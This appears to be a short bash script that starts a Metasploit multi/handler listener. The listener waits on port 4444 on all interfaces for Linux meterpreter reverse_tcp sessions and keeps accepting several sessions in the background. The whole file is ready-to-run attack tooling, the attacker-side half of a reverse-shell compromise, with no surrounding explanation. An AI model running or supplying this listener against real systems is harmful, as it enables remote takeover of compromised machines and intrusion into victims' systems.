#!/bin/bash

msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; run -jz"
